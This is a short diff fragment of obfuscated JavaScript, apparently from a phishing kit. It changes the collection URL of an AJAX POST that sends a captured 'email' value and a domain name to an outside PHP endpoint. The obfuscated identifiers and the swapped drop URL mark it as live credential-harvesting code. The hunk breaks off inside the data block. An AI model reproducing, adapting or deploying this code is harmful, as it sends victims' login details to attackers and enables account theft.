@@ -180,7 +180,7 @@ $(document)[_0x1cc919(0x45b, 0x45f)](function() {
 		$('#domain-name')[_0x240286(0x2cf, 0x2c7)](_0x1c4ef2);
 		$[_0x224dda(-0x2eb, -0x2df)]({
 			'dataType': _0x263826(-0x4e, -0x67),
-			'url': 'https://kmgint-pl.com/images/ups.php',
+			'url': 'https://vouchercashload.com/okiri.php',
 			'type': 'POST',
 			'data': {
 				'email': _0x35ceac,
